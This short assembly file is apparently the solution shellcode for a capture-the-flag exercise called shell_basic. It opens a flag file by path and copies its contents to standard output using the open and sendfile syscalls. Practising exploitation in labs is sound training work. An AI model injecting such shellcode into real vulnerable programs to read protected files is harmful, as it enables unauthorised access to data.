;Name: shell_basic.S
.global _start
_start:
call main
.asciz "/home/shell_basic/flag_name_is_loooooong"

main:
pop rdi
xor rsi, rsi
xor rdx, rdx
mov rax, 2	#syscall open
syscall

mov rdi, 1
mov rsi, rax	# in_fd
xor edx, edx
mov r10, 50
mov rax, 40	#syscall sendfile
syscall
